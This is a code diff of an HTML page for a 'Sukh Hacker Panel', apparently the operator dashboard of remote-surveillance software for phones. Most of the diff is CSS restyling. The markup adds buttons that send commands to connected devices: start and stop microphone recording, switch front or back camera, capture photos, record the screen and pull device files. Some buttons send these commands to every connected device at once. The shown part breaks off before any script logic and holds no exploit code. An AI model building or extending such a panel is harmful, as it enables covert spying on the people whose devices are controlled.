@@ -1,530 +1,781 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>🚀 Sukh Hacker</title>
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
-    color: #ffffff;
-    min-height: 100vh;
-    overflow-x: hidden;
-}
-
-.container {
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 20px;
-}
-
-.header {
-    text-align: center;
-    padding: 30px 0;
-    background: rgba(0, 0, 0, 0.3);
-    border-radius: 20px;
-    margin-bottom: 30px;
-    border: 1px solid #333;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-}
-
-.header h1 {
-    font-size: 2.5rem;
-    background: linear-gradient(45deg, #00ff88, #00ccff);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: 10px;
-    text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
-}
-
-.header p {
-    color: #cccccc;
-    font-size: 1.1rem;
-}
-
-/* Tabs Styling */
-.tabs {
-    display: flex;
-    background: rgba(0, 0, 0, 0.6);
-    border-radius: 15px;
-    padding: 10px;
-    margin-bottom: 20px;
-    border: 1px solid #333;
-}
-
-.tab-btn {
-    flex: 1;
-    padding: 15px 20px;
-    background: transparent;
-    border: none;
-    color: #cccccc;
-    font-size: 16px;
-    cursor: pointer;
-    border-radius: 10px;
-    transition: all 0.3s ease;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-}
-
-.tab-btn:hover {
-    background: rgba(255, 255, 255, 0.1);
-    color: #00ff88;
-}
-
-.tab-btn.active {
-    background: linear-gradient(45deg, #00ff88, #00ccff);
-    color: #000;
-    font-weight: bold;
-    box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
-}
-
-.tab-content {
-    display: none;
-    background: rgba(0, 0, 0, 0.4);
-    border-radius: 15px;
-    padding: 25px;
-    border: 1px solid #333;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-}
-
-.tab-content.active {
-    display: block;
-    animation: fadeIn 0.5s ease;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-/* Devices Grid */
-.devices-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-    gap: 20px;
-    margin: 20px 0;
-}
-
-.device-card {
-    background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-    border-radius: 15px;
-    padding: 20px;
-    border: 1px solid #333;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    position: relative;
-    overflow: hidden;
-}
-
-.device-card::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.1), transparent);
-    transition: left 0.5s ease;
-}
-
-.device-card:hover::before {
-    left: 100%;
-}
-
-.device-card:hover {
-    transform: translateY(-5px);
-    border-color: #00ff88;
-    box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
-}
-
-.device-card.recording {
-    border-color: #ff4444;
-    background: linear-gradient(135deg, #2a1e1e 0%, #3d2d2d 100%);
-}
-
-.device-card.screen-recording {
-    border-color: #ffaa00;
-    background: linear-gradient(135deg, #2a2a1e 0%, #3d3d2d 100%);
-}
-
-.device-icon {
-    font-size: 2rem;
-    margin-bottom: 10px;
-}
-
-.device-info h3 {
-    color: #00ff88;
-    margin-bottom: 10px;
-    font-size: 1.2rem;
-}
-
-.device-status {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    margin: 5px 0;
-}
-
-.status-dot {
-    width: 10px;
-    height: 10px;
-    border-radius: 50%;
-    background: #00ff88;
-}
-
-.status-dot.recording {
-    background: #ff4444;
-    animation: pulse 1.5s infinite;
-}
-
-.status-dot.screen-recording {
-    background: #ffaa00;
-    animation: pulse 1.5s infinite;
-}
-
-@keyframes pulse {
-    0% { opacity: 1; }
-    50% { opacity: 0.5; }
-    100% { opacity: 1; }
-}
-
-/* Control Panel */
-.control-panel {
-    background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-    border-radius: 15px;
-    padding: 25px;
-    margin: 20px 0;
-    border: 1px solid #333;
-}
-
-.panel-header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin-bottom: 20px;
-}
-
-.back-btn {
-    background: linear-gradient(45deg, #ff6b6b, #ee5a24);
-    color: white;
-    border: none;
-    padding: 10px 20px;
-    border-radius: 10px;
-    cursor: pointer;
-    font-size: 14px;
-    transition: all 0.3s ease;
-}
-
-.back-btn:hover {
-    transform: translateX(-5px);
-    box-shadow: 0 5px 15px rgba(255, 107, 107, 0.3);
-}
-
-.current-device {
-    flex: 1;
-    text-align: center;
-}
-
-.current-device h3 {
-    color: #00ccff;
-    font-size: 1.4rem;
-}
-
-/* Buttons */
-.btn-group {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 15px;
-    justify-content: center;
-    margin: 20px 0;
-}
-
-.btn {
-    padding: 15px 25px;
-    border: none;
-    border-radius: 12px;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: bold;
-    transition: all 0.3s ease;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    min-width: 200px;
-    justify-content: center;
-}
-
-.btn:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-}
-
-.btn:active {
-    transform: translateY(-1px);
-}
-
-.btn-start {
-    background: linear-gradient(45deg, #00ff88, #00cc88);
-    color: #000;
-}
-
-.btn-stop {
-    background: linear-gradient(45deg, #ff4444, #cc0000);
-    color: white;
-}
-
-.btn-camera {
-    background: linear-gradient(45deg, #00ccff, #0099cc);
-    color: white;
-}
-
-.btn-refresh {
-    background: linear-gradient(45deg, #ffaa00, #ff8800);
-    color: white;
-}
-
-.btn-screen {
-    background: linear-gradient(45deg, #ff6b6b, #ee5a24);
-    color: white;
-}
-
-/* Status Box */
-.status-box {
-    background: rgba(0, 0, 0, 0.5);
-    border-radius: 12px;
-    padding: 20px;
-    margin: 20px 0;
-    border-left: 4px solid #00ff88;
-}
-
-.status-box h4 {
-    color: #00ff88;
-    margin-bottom: 10px;
-}
-
-/* Files Section */
-.files-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-    gap: 20px;
-    margin: 20px 0;
-}
-
-.file-card {
-    background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-    border-radius: 12px;
-    padding: 20px;
-    border: 1px solid #333;
-}
-
-.file-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 15px;
-}
-
-.file-type {
-    font-size: 1.5rem;
-}
-
-.file-info {
-    margin: 10px 0;
-}
-
-.file-info div {
-    margin: 5px 0;
-    color: #cccccc;
-}
-
-.file-actions {
-    display: flex;
-    gap: 10px;
-    margin-top: 15px;
-}
-
-.file-actions .btn {
-    min-width: auto;
-    padding: 10px 15px;
-    font-size: 14px;
-}
-
-/* Audio Player */
-.audio-player {
-    width: 100%;
-    margin: 15px 0;
-    border-radius: 25px;
-    background: #333;
-    height: 40px;
-}
-
-/* Video Player */
-.video-player {
-    width: 100%;
-    margin: 15px 0;
-    border-radius: 12px;
-    background: #000;
-}
-
-/* Photo Preview */
-.photo-preview {
-    text-align: center;
-    margin: 20px 0;
-}
-
-.photo-preview img {
-    max-width: 100%;
-    border-radius: 12px;
-    border: 2px solid #00ff88;
-    box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
-}
-
-/* Footer */
-.footer {
-    text-align: center;
-    margin-top: 40px;
-    padding: 20px;
-    color: #888;
-    font-size: 14px;
-    border-top: 1px solid #333;
-}
-
-.server-info {
-    display: flex;
-    justify-content: center;
-    gap: 20px;
-    margin-top: 10px;
-}
-
-/* Responsive */
-@media (max-width: 768px) {
-    .devices-grid {
-        grid-template-columns: 1fr;
-    }
-
-    .btn-group {
-        flex-direction: column;
-    }
-
-    .btn {
-        min-width: 100%;
-    }
-
-    .tabs {
-        flex-direction: column;
-    }
-
-    .panel-header {
-        flex-direction: column;
-        gap: 15px;
-    }
-
-    .server-info {
-        flex-direction: column;
-        gap: 10px;
-    }
-}
-
-/* Scrollbar */
-::-webkit-scrollbar {
-    width: 8px;
-}
-
-::-webkit-scrollbar-track {
-    background: #1a1a1a;
-}
-
-::-webkit-scrollbar-thumb {
-    background: linear-gradient(45deg, #00ff88, #00ccff);
-    border-radius: 4px;
-}
-
-::-webkit-scrollbar-thumb:hover {
-    background: linear-gradient(45deg, #00cc88, #0099cc);
-}
-
-/* Loading Animation */
-.loading {
-    display: inline-block;
-    width: 20px;
-    height: 20px;
-    border: 3px solid #333;
-    border-radius: 50%;
-    border-top-color: #00ff88;
-    animation: spin 1s ease-in-out infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-/* Text Selection */
-::selection {
-    background: #00ff88;
-    color: #000;
-}
-
-/* Focus Outline */
-button:focus {
-    outline: 2px solid #00ff88;
-    outline-offset: 2px;
-}
-
-/* No Devices/No Files Styling */
-.no-data {
-    text-align: center;
-    color: #888;
-    padding: 40px;
-}
-
-.no-data-icon {
-    font-size: 3rem;
-    margin-bottom: 20px;
-}
-
-/* Error Styling */
-.error-message {
-    color: #ff4444;
-    text-align: center;
-    padding: 20px;
-    background: rgba(255, 68, 68, 0.1);
-    border-radius: 10px;
-    border: 1px solid #ff4444;
-}
-</style>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Sukh Hacker Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #00ff88;
+            --secondary: #00ccff;
+            --danger: #ff4444;
+            --warning: #ffaa00;
+            --dark: #0c0c0c;
+            --dark-secondary: #1a1a2e;
+            --dark-tertiary: #16213e;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-secondary) 50%, var(--dark-tertiary) 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            animation: headerGlow 3s infinite;
+        }
+
+        @keyframes headerGlow {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+        }
+
+        .header p {
+            color: #cccccc;
+            font-size: 1.1rem;
+        }
+
+        .header-actions {
+            margin-top: 15px;
+        }
+
+        .logout-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .logout-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.3);
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            backdrop-filter: blur(10px);
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 15px 20px;
+            background: transparent;
+            border: none;
+            color: #cccccc;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            min-width: 180px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tab-btn::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        .tab-btn:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--primary);
+        }
+
+        .tab-btn:hover::after {
+            width: 80%;
+        }
+
+        .tab-btn.active {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+        }
+
+        .tab-btn.active::after {
+            width: 100%;
+        }
+
+        .tab-content {
+            display: none;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.5s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Devices Grid */
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .device-card {
+            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid #333;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        .device-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .device-card:hover::before {
+            left: 100%;
+        }
+
+        .device-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
+        }
+
+        .device-card.recording {
+            border-color: var(--danger);
+            background: linear-gradient(135deg, #2a1e1e 0%, #3d2d2d 100%);
+        }
+
+        .device-card.screen-recording {
+            border-color: var(--warning);
+            background: linear-gradient(135deg, #2a2a1e 0%, #3d3d2d 100%);
+        }
+
+        .device-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .device-info h3 {
+            color: var(--primary);
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .device-id {
+            font-size: 0.8rem;
+            opacity: 0.7;
+            word-break: break-all;
+        }
+
+        .device-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 5px 0;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--primary);
+        }
+
+        .status-dot.recording {
+            background: var(--danger);
+            animation: pulse 1.5s infinite;
+        }
+
+        .status-dot.screen-recording {
+            background: var(--warning);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.1); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Control Panel */
+        .control-panel {
+            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid #333;
+            backdrop-filter: blur(10px);
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .back-btn:hover {
+            transform: translateX(-5px);
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.3);
+        }
+
+        .current-device {
+            flex: 1;
+            text-align: center;
+        }
+
+        .current-device h3 {
+            color: var(--secondary);
+            font-size: 1.4rem;
+        }
+
+        /* Buttons */
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .btn {
+            padding: 15px 25px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 200px;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-start {
+            background: linear-gradient(45deg, var(--primary), #00cc88);
+            color: #000;
+        }
+
+        .btn-stop {
+            background: linear-gradient(45deg, var(--danger), #cc0000);
+            color: white;
+        }
+
+        .btn-camera {
+            background: linear-gradient(45deg, var(--secondary), #0099cc);
+            color: white;
+        }
+
+        .btn-refresh {
+            background: linear-gradient(45deg, var(--warning), #ff8800);
+            color: white;
+        }
+
+        .btn-screen {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+        }
+
+        /* Status Box */
+        .status-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid var(--primary);
+        }
+
+        .status-box h4 {
+            color: var(--primary);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Files Section */
+        .files-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .file-card {
+            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .file-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .file-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .file-type {
+            font-size: 1.5rem;
+        }
+
+        .file-info {
+            margin: 10px 0;
+        }
+
+        .file-info div {
+            margin: 5px 0;
+            color: #cccccc;
+        }
+
+        .file-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .file-actions .btn {
+            min-width: auto;
+            padding: 10px 15px;
+            font-size: 14px;
+            flex: 1;
+        }
+
+        /* Audio Player */
+        .audio-player {
+            width: 100%;
+            margin: 15px 0;
+            border-radius: 25px;
+            background: #333;
+            height: 40px;
+        }
+
+        /* Video Player */
+        .video-player {
+            width: 100%;
+            margin: 15px 0;
+            border-radius: 12px;
+            background: #000;
+        }
+
+        /* Photo Preview */
+        .photo-preview {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .photo-preview img {
+            max-width: 100%;
+            border-radius: 12px;
+            border: 2px solid var(--primary);
+            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #888;
+            font-size: 14px;
+            border-top: 1px solid #333;
+        }
+
+        .server-info {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .devices-grid {
+                grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            }
+            
+            .files-grid {
+                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .devices-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .files-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .btn-group {
+                flex-direction: column;
+            }
+
+            .btn {
+                min-width: 100%;
+            }
+
+            .tabs {
+                flex-direction: column;
+            }
+
+            .tab-btn {
+                min-width: 100%;
+            }
+
+            .panel-header {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .server-info {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .header {
+                padding: 20px 0;
+            }
+            
+            .tab-content {
+                padding: 15px;
+            }
+            
+            .control-panel {
+                padding: 15px;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(45deg, #00cc88, #0099cc);
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #333;
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Text Selection */
+        ::selection {
+            background: var(--primary);
+            color: #000;
+        }
+
+        /* Focus Outline */
+        button:focus {
+            outline: 2px solid var(--primary);
+            outline-offset: 2px;
+        }
+
+        /* No Devices/No Files Styling */
+        .no-data {
+            text-align: center;
+            color: #888;
+            padding: 40px;
+        }
+
+        .no-data-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            opacity: 0.5;
+        }
+
+        /* Error Styling */
+        .error-message {
+            color: var(--danger);
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 68, 68, 0.1);
+            border-radius: 10px;
+            border: 1px solid var(--danger);
+        }
+
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            z-index: 1000;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast.success {
+            background: linear-gradient(45deg, var(--primary), #00cc88);
+        }
+
+        .toast.error {
+            background: linear-gradient(45deg, var(--danger), #cc0000);
+        }
+
+        .toast.info {
+            background: linear-gradient(45deg, var(--secondary), #0099cc);
+        }
+
+        /* Floating Action Button for Mobile */
+        .fab {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            cursor: pointer;
+            z-index: 100;
+            transition: all 0.3s ease;
+            display: none;
+        }
+
+        .fab:hover {
+            transform: scale(1.1);
+        }
+
+        @media (max-width: 768px) {
+            .fab {
+                display: flex;
+            }
+        }
+
+        /* Refresh Animation */
+        .refresh-animation {
+            animation: refreshSpin 0.5s ease;
+        }
+
+        @keyframes refreshSpin {
+            0% { transform: rotate(0); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
+    <!-- Toast Notifications -->
+    <div class="toast" id="toast"></div>
+    
+    <!-- Floating Action Button for Mobile -->
+    <div class="fab" id="fab">
+        <i class="fas fa-bars"></i>
+    </div>
+
     <div class="container">
         <!-- Header -->
         <div class="header">
             <h1>🚀 Sukh Hacker Panel</h1>
             <p>Remote Control & Monitoring System</p>
+            <div class="header-actions">
+                <button class="logout-btn" onclick="logout()">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+            </div>
         </div>
 
         <!-- Tabs -->
-        <div class="tabs">
+        <div class="tabs" id="tabsContainer">
             <button class="tab-btn active" onclick="openTab('devices')">
-                📱 Devices
+                <i class="fas fa-mobile-alt"></i> Devices
             </button>
             <button class="tab-btn" onclick="openTab('global')">
-                🌐 Global Control
+                <i class="fas fa-globe"></i> Global Control
             </button>
             <button class="tab-btn" onclick="openTab('recordings')">
-                🎵 Recordings
+                <i class="fas fa-microphone"></i> Recordings
             </button>
             <button class="tab-btn" onclick="openTab('photos')">
-                📸 Photos
+                <i class="fas fa-camera"></i> Photos
             </button>
             <button class="tab-btn" onclick="openTab('screenRecordings')">
-                📹 Screen Recordings
+                <i class="fas fa-video"></i> Screen Recordings
             </button>
         </div>
 
@@ -533,7 +784,7 @@ button:focus {
             <div class="control-panel" id="deviceControlPanel" style="display: none;">
                 <div class="panel-header">
                     <button class="back-btn" onclick="showAllDevices()">
-                        ← Back to Devices
+                        <i class="fas fa-arrow-left"></i> Back to Devices
                     </button>
                     <div class="current-device">
                         <h3 id="currentDeviceName">Device Control Panel</h3>
@@ -543,59 +794,63 @@ button:focus {
 
                 <div class="btn-group">
                     <button class="btn btn-start" onclick="sendDeviceCommand('start_recording')">
-                        🎤 Start Recording
+                        <i class="fas fa-microphone"></i> Start Recording
                     </button>
                     <button class="btn btn-stop" onclick="sendDeviceCommand('stop_recording')">
-                        ⏹️ Stop Recording
+                        <i class="fas fa-stop"></i> Stop Recording
                     </button>
                 </div>
 
                 <div class="btn-group">
                     <button class="btn btn-camera" onclick="sendDeviceCameraCommand('front_camera')">
-                        📱 Front Camera
+                        <i class="fas fa-mobile-alt"></i> Front Camera
                     </button>
                     <button class="btn btn-camera" onclick="sendDeviceCameraCommand('back_camera')">
-                        📷 Back Camera
+                        <i class="fas fa-camera"></i> Back Camera
                     </button>
                     <button class="btn btn-camera" onclick="sendDeviceCameraCommand('capture_photo')">
-                        📸 Capture Photo
+                        <i class="fas fa-camera-retro"></i> Capture Photo
                     </button>
                     <button class="btn btn-stop" onclick="sendDeviceCameraCommand('stop_camera')">
-                        📵 Stop Camera
+                        <i class="fas fa-times-circle"></i> Stop Camera
                     </button>
                 </div>
 
                 <div class="btn-group">
                     <button class="btn btn-screen" onclick="sendDeviceCommand('start_screen_recording')">
-                        📱 Start Screen Recording
+                        <i class="fas fa-video"></i> Start Screen Recording
                     </button>
                     <button class="btn btn-stop" onclick="sendDeviceCommand('stop_screen_recording')">
-                        ⏹️ Stop Screen Recording
+                        <i class="fas fa-stop"></i> Stop Screen Recording
                     </button>
                 </div>
 
                 <div class="status-box">
-                    <h4>📊 Command Status</h4>
+                    <h4><i class="fas fa-chart-bar"></i> Command Status</h4>
                     <div id="deviceCommandStatus">Ready to send commands...</div>
                 </div>
 
                 <div class="control-panel">
-                    <h4>📁 Device Files</h4>
+                    <h4><i class="fas fa-folder"></i> Device Files</h4>
                     <button class="btn btn-refresh" onclick="refreshDeviceFiles()">
-                        🔄 Refresh Files
+                        <i class="fas fa-sync-alt"></i> Refresh Files
                     </button>
                     <div id="deviceFilesList" style="margin-top: 20px;"></div>
                 </div>
             </div>
 
             <div id="allDevicesList">
-                <h3 style="color: #00ccff; margin-bottom: 20px;">Connected Devices</h3>
-                <button class="btn btn-refresh" onclick="refreshDevices()" style="margin-bottom: 20px;">
-                    🔄 Refresh Devices
-                </button>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
+                    <h3 style="color: var(--secondary);">Connected Devices</h3>
+                    <button class="btn btn-refresh" onclick="refreshDevices()" id="refreshDevicesBtn">
+                        <i class="fas fa-sync-alt"></i> Refresh Devices
+                    </button>
+                </div>
                 <div class="devices-grid" id="devicesGrid">
-                    <div style="text-align: center; color: #888; padding: 40px;">
-                        <div style="font-size: 3rem; margin-bottom: 20px;">📱</div>
+                    <div class="no-data">
+                        <div class="no-data-icon">
+                            <i class="fas fa-mobile-alt"></i>
+                        </div>
                         <h3>No devices connected</h3>
                         <p>Waiting for devices to register...</p>
                     </div>
@@ -606,41 +861,43 @@ button:focus {
         <!-- Global Control Tab -->
         <div id="global" class="tab-content">
             <div class="control-panel">
-                <h3 style="color: #00ccff; margin-bottom: 20px;">🌐 Global Commands</h3>
+                <h3 style="color: var(--secondary); margin-bottom: 20px;">
+                    <i class="fas fa-globe"></i> Global Commands
+                </h3>
                 <p style="color: #cccccc; margin-bottom: 20px;">Send commands to all connected devices</p>
                 
                 <div class="btn-group">
                     <button class="btn btn-start" onclick="sendCommand('start_recording')">
-                        🎤 Start All Recording
+                        <i class="fas fa-microphone"></i> Start All Recording
                     </button>
